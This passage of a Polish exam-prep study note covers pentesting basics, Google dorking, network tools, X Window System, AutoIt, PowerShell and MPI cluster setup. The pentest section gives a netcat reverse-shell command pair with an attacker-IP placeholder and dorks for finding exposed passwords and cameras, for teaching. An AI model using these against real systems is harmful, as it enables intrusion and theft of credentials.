*   **Testy penetracyjne (pentesting)**: Etyczny i uzgodniony, kontrolowany atak na system, mający na celu ocenę praktycznego bezpieczeństwa i identyfikację znanych podatności.
*   **Podatność (vulnerability)**: Słabość systemu, którą atakujący może wykorzystać do naruszenia uprawnień, wykonania nieautoryzowanych operacji lub uszkodzenia systemu.
*   **Exploit**: Metoda (kod, zachowanie, przygotowane dane) pozwalająca atakującemu wykorzystać podatność.
*   **Eskalacja uprawnień (privilege escalation)**: Uzyskanie wyższych praw dostępu niż pierwotnie przyznane.
*   **Typy pentestów**:
    *   **Black-box**: Najbardziej realistyczne, atakujący ma najmniejszą wiedzę o systemie.
    *   **Gray-box**: Pośrednie między black-box a white-box, atakujący ma podstawowy dostęp.
    *   **White-box**: Atakujący ma dostęp do pełnej dokumentacji systemu (podobne do przeglądu kodu).

#### B. Biały wywiad (OSINT) i Google Dorking
*   **Biały wywiad (OSINT - open-source intelligence)**: Gromadzenie informacji z ogólnie dostępnych i jawnych źródeł.
    *   **Źródła**: Życie publiczne, wypowiedzi przedstawicieli państwa, Internet (media społecznościowe, fora), prasa, dokumentacja prawna, rejestry, ogłoszenia sądowe, wydawnictwa marketingowe, analizy produktów (inżynieria odwrotna).
*   **Google Dorking (Google Hacking)**: Zaawansowana technika wyszukiwania w Google z użyciem specjalnych operatorów i zapytań do odnajdywania ukrytych lub wrażliwych danych.
    *   **Operatory (Keywords)**:
        *   `site:<domena>`: Wyszukiwanie tylko w określonej domenie (np. `site:polsl.pl`).
        *   `intitle:"<tekst>"`: Wyszukiwanie tekstu w tytule strony.
        *   `inurl:"<tekst>"`: Wyszukiwanie tekstu w adresie URL.
        *   `intext:"<tekst>"`: Wyszukiwanie tekstu w treści strony.
        *   `filetype:<rozszerzenie>`: Wyszukiwanie plików o określonym rozszerzeniu (np. `filetype:pdf`, `filetype:pptx`).
    *   **Przykłady zastosowań**: Hasła i pliki konfiguracyjne (`filetype:env DB_PASSWORD`), otwarte kamery IP (`inurl:/view.shtml`), podatne strony WWW (`intext:"SQL syntax error"`), dokumenty poufne (`filetype:pdf "confidential"`), logi serwerów (`intitle:"index of" error.log`).
    *   Zbiór gotowych dorków: Google Hacking Database na exploit-db.com.

#### C. Narzędzia do testów penetracyjnych (sieciowe)
*   **`netstat`**: Wszechstronne narzędzie do wyświetlania aktywnych połączeń sieciowych (TCP, UDP), portów nasłuchujących, tabeli trasowania, statystyk sieciowych.
    *   **Parametry**:
        *   `-a`: Wszystkie aktywne połączenia i porty nasłuchujące.
        *   `-n`: Adresy i porty w postaci numerycznej (bez konwersji na nazwy).
        *   `-o`: Z identyfikatorami procesów (PID).
        *   `-p <protokół>`: Połączenia dla określonego protokołu (np. `tcp`, `udp`).
        *   `-r`: Tabela trasowania IP.
        *   `-s`: Statystyki dla protokołów.
    *   **Zastosowanie w pentestach**: Do szybkiego skanowania sieci i wykrywania anomalii.
*   **`lsof`**: Wyświetla listę otwartych plików i procesów, w tym porty sieciowe.
    *   **Parametry**:
        *   `-i`: Pokazuje połączenia sieciowe (TCP/UDP).
        *   `-P`: Wyświetla numery portów zamiast nazw usług.
        *   `-n`: Wyłącza resolucję DNS (szybsze).
        *   `-p <PID>`: Filtruje po PID procesu.
    *   **Zastosowanie w pentestach**: Do szczegółowej analizy procesów i plików, identyfikacji procesów używających portów.
    *   **Pytanie**: `lsof` lepiej nadaje się do znalezienia nasłuchującego procesu `nc` na twoim komputerze, ponieważ bezpośrednio pokazuje PID i nazwę procesu (`-i` i `-P` są bardzo pomocne).
*   **`nmap` (Network Mapper)**: Służy do skanowania portów i wykrywania usług w sieci, identyfikacji systemów operacyjnych.
    *   **Parametry**:
        *   `-sP` / `-sn`: Ping scan – sprawdza, które hosty są aktywne (bez skanowania portów).
        *   `-sS`: SYN scan (szybki i dyskretny, nie nawiązuje pełnego połączenia TCP).
        *   `-sT`: TCP connect scan (standardowe połączenie TCP, łatwiejsze do wykrycia).
        *   `-sU`: UDP scan (wolne, ale pokazuje otwarte porty UDP).
        *   `-sV`: Wersjonowanie usług (np. Apache 2.4.7).
        *   `-O`: Wykrywanie systemu operacyjnego.
*   **`netcat` (nc)**: Uniwersalne narzędzie skanująco-monitorujące, prosty serwer. Może być używany do ataku „reverse shell”, gdzie ofiara nieświadomie inicjuje połączenie do atakującego, dając mu kontrolę nad systemem.
    *   **Reverse shell**:
        *   Atakujący (serwer): `nc -lvnp <PORT>` (nasłuchuje na porcie).
        *   Atakowany (klient): `nc -e /bin/bash <IP_ATAKUJACEGO> <PORT>` (nawiązuje połączenie i udostępnia powłokę bash).

---

### 6. X Window System

#### A. Architektura i komponenty
*   **X Window System (X, Xorg)**: Kolekcja funkcji i protokołów wyświetlających informacje graficzne na ekranie i administrujących klawiaturą/myszą. Bezpłatną implementacją jest Xorg (Linux). Stanowi podstawę GUI, ale sam nie dostarcza interfejsu graficznego użytkownika.
*   **Architektura klient-serwer**:
    *   **X-Serwer (np. Xorg)**: Uruchomiony na maszynie lokalnej. Obsługuje urządzenia wejścia/wyjścia (monitor, klawiatura, mysz) i rysuje komponenty.
    *   **X-Klient (np. Firefox, Eclipse)**: Uruchomiony na maszynie zdalnej (lub lokalnej). Wysyła do X-serwera informacje o tym, jakie komponenty narysować, i odbiera informacje o zdarzeniach.
    *   `localhost` (127.0.0.1) jest używany w przypadku pojedynczej maszyny.
*   **Komponenty dodatkowe**:
    *   **X Font Serwer (xfs)**: Przelicza parametry czcionek i udostępnia je X-serwerowi.
    *   **Menadżer Okien (Window Manager)**: Odpowiada za wygląd okien (ramki, przyciski, menu) i zachowanie interfejsu użytkownika. Wybierany przez użytkownika. Przykłady: Fluxbox, KWin (KDE), Openbox, i3, Enlightenment.
    *   **Display Manager (Menadżer logowania)**: Odpowiada za uruchomienie serwera X i wyświetlenie ekranu logowania. Wspólny dla wszystkich użytkowników. Po uwierzytelnieniu uruchamia odpowiedniego Window Managera. Przykłady: lightDM, kdm, gdm, xdm.

#### B. Uruchamianie i konfiguracja
*   **Uruchamianie X Servera**:
    *   W Debianie/Ubuntu preinstalowany i uruchamiany automatycznie.
    *   Wyłączenie: `sudo systemctl disable gdm.service` (lub innego display managera).
    *   Ręczne uruchomienie bez menadżera logowania:
        *   Upewnij się, że masz plik `~/.xinitrc` z zawartością `exec fluxbox` (lub inny window manager).
        *   Użyj skryptu `startx`, który inicjalizuje `initx` do właściwego uruchomienia X Window System.
    *   Można uruchomić sam Xorg za pomocą `sudo Xorg`. Wtedy ekran jest czarny, bo nic nie jest narysowane.
    *   **`export DISPLAY=:0`**: Ustawia zmienną środowiskową `DISPLAY`, aby aplikacje uruchamiane w danym terminalu wiedziały, gdzie wyświetlać grafikę (w tym przypadku na pierwszym wyświetlaczu X Serwera).
*   **Przełączanie konsoli**:
    *   Z trybu tekstowego do graficznego: `Alt+F7`.
    *   Z trybu graficznego do tekstowego: `Ctrl+Alt+FN` (gdzie N to numer konsoli tekstowej, np. 1).
    *   W maszynach wirtualnych: `Prawy Ctrl` + `Prawy Alt` + `FN`.
*   **Pliki konfiguracyjne**:
    *   **`/etc/X11/xorg.conf`**: Główny plik konfiguracyjny Xorg. Domyślnie Xorg auto-konfiguruje się. Można go wygenerować za pomocą `Xorg -configure`.
    *   **Pytanie**: Służy do definiowania wszystkich parametrów Xorg, takich jak rozdzielczość, sterowniki, układy klawiatury. `Xorg -configure` wykonuje autokonfigurację i zapisuje ją do pliku, który można potem edytować.
    *   **`/etc/X11/app-defaults/`**: Katalog do systemowej konfiguracji klientów X.
    *   **`~/.Xresources`**: Plik do konfiguracji klientów X na poziomie użytkownika (np. wyglądu aplikacji, ustawień czcionek).
    *   **Pytanie**: Pliki w `/etc/X11/app-defaults/` służą do definiowania domyślnych zasobów dla aplikacji X (np. czcionek, kolorów, tekstów przycisków) na poziomie całego systemu. `~/.Xresources` pełni podobną rolę, ale dla konkretnego użytkownika, nadpisując ustawienia systemowe.
    *   **`~/.xinitrc`**: Skrypt uruchamiany przy starcie X serwera, służy do uruchamiania programów i ustawiania zmiennych środowiskowych (np. menadżera okien, terminala).
*   **Ustawienie mapy klawiatury**:
    *   W środowisku X: `setxkbmap pl`.
    *   W trybie tekstowym: `loadkeys pl`.
    *   Stałe ustawienie w Debianie/Ubuntu: Edycja pliku `/etc/default/keyboard` i ustawienie `XKBLAYOUT=pl`.

---

### 7. Programowanie i automatyzacja

#### A. AutoIt (Windows)
*   **Definicja**: Narzędzie do automatyzacji interfejsów użytkownika w systemie Windows. Używa własnego języka skryptowego i działa jako "wrapper" dla wybranych funkcji WindowsAPI.
*   **Pliki**: Skrypty tworzone w plikach `.au3`.
*   **Funkcje podstawowe**:
    *   `Run`: Uruchamia aplikację.
    *   `WinWait`: Czeka na okno.
    *   `WinMove`: Zmienia pozycję i rozmiar okna.
    *   `Send`: Wysyła tekst (np. do okna Notatnika).
    *   `HotKeySet`: Ustawia skrót klawiszowy.
    *   `MsgBox`: Wyświetla komunikat.
    *   Pętla `While 1`: Utrzymuje skrypt działający w tle.
*   **Formularze GUI**: Możliwość budowania interaktywnych formularzy z polami tekstowymi, checkboxami i przyciskami. Walidacja pól, podsumowania w `MsgBox`, zapis danych do plików (`log.txt`).

#### B. PowerShell (Windows, Linux, macOS)
*   **Definicja**: Obiektowo zorientowany język skryptowy dla administratorów systemów, następcą `cmd.exe`. Zbudowany na .NET Framework. Dostępny na Windows, Linux, macOS (PowerShell Core).
*   **Cechy**:
    *   **Zdalne uruchamianie**: Skrypty i polecenia mogą być uruchamiane zdalnie na wielu komputerach.
    *   **Praca w tle**: Asynchroniczne uruchamianie poleceń.
    *   **Obsługa błędów**: Mechanizmy `Try{}`, `Catch{}`, `Finally{}`.
    *   **Transfer plików**: Wsparcie dla BITS (Background Intelligent Transfer Service).
*   **Cmdlety**: Zamiast komend. Są obiektami klasy .NET Frameworks. Format: `Czasownik-Rzeczownik`.
    *   **Podstawowe czasowniki**: `Get` (uzyskać), `Start` (uruchomić), `Out` (uzyskać na wyjściu), `Stop` (zatrzymać), `Set` (zdefiniować), `New` (utworzyć).
    *   **Przykłady**: `Get-Process`, `Get-Service`, `Stop-Process`, `Get-Help`.
*   **Zmienne**: Zaczynają się od `$`, są obiektami .NET. Specjalne zmienne: `$Error`, `$Host`, `$PID`, `$NULL`, `$True`, `$False`.
*   **Pętle**: `for`, `foreach`, `while`, `until`.
*   **Warunki**: `if-elseif-else`, `switch`.
*   **Skrypty (`.ps1`)**: Domyślnie nie uruchamiane przez podwójne kliknięcie.
*   **Polityka wykonywania skryptów (`ExecutionPolicy`)**: Kontroluje możliwość uruchamiania skryptów.
    *   **`Get-ExecutionPolicy`**: Sprawdza aktualny poziom.
    *   **`Set-ExecutionPolicy <poziom>`**: Zmienia politykę.
    *   **Poziomy**:
        *   `Restricted`: Domyślny, brak możliwości uruchamiania skryptów.
        *   `AllSigned`: Tylko skrypty podpisane przez zaufanego wydawcę.
        *   `RemoteSigned`: Niepodpisane skrypty z lokalnego komputera dozwolone, z Internetu muszą być podpisane.
        *   `Unrestricted`: Wszystkie niepodpisane skrypty dozwolone (z ostrzeżeniem dla pobranych z Internetu).

#### C. MPI (Message Passing Interface)
*   **Definicja**: System umożliwiający wydajne obliczenia równoległe, pozwalający wielu procesom komunikować się i współpracować na różnych maszynach (węzłach). Kluczowa rola w obliczeniach o wysokiej wydajności (HPC).
*   **Model komunikacji**: Procesy MPI działają niezależnie i mają własną przestrzeń pamięci. Muszą jawnie wysyłać i odbierać wiadomości, aby się komunikować.
*   **Protokoły komunikacji**:
    *   W obrębie tego samego węzła: Pamięć współdzielona.
    *   Między różnymi węzłami: TCP.
*   **Konfiguracja klastra MPI**:
    *   Ustawienie liczby rdzeni CPU w VM.
    *   **Sieć**: Użycie `Bridged Adapter` i odświeżenie adresu MAC dla widoczności między VM.
    *   **`/etc/hosts`**: Dodanie rekordów manager'a i worker'a dla resolvowania nazw.
    *   **Użytkownik `mpi`**: Utworzenie użytkownika, zmiana hasła, dodanie do grupy `sudo`.
    *   **SSH**: Instalacja `openssh-server`, generowanie kluczy (`ssh-keygen`), wymiana kluczy (`ssh-copy-id`) dla logowania bez hasła między węzłami.
    *   **NFS (Network File System)**:
        *   **Manager (serwer NFS)**: Instalacja `nfs-kernel-server`, utworzenie katalogu `shared`, konfiguracja `/etc/exports` (`/home/mpi/shared *(rw,sync,no_root_squash,no_subtree_check)`), zastosowanie zmian (`exportfs -a`), restart serwisu (`systemctl restart nfs-kernel-server`).
        *   **Worker (klient NFS)**: Instalacja `nfs-common`, utworzenie katalogu `shared`, montowanie zasobu (`sudo mount -t nfs manager:/home/mpi/shared /home/mpi/shared`). Sprawdzenie widoczności plików.
    *   **OpenMPI**: Instalacja pakietów `openmpi-bin openmpi-common libopenmpi-dev`.
    *   **Kompilacja kodu MPI**: `mpicc -o cpi cpi.c`.
    *   **Uruchamianie programu MPI**:
        *   Na managerze: `mpirun -np 2 ./cpi`.
        *   Na wszystkich węzłach (z podaniem liczby procesów na każdy host): `mpirun -np 6 --host worker1:3,localhost:3 ./cpi`.
    *   **Monitorowanie**: `top` do sprawdzania wykorzystania rdzeni CPU.

---

Mam nadzieję, że ta notatka jest wyczerpująca i pomoże Ci w przygotowaniach do kolokwium! Powodzenia!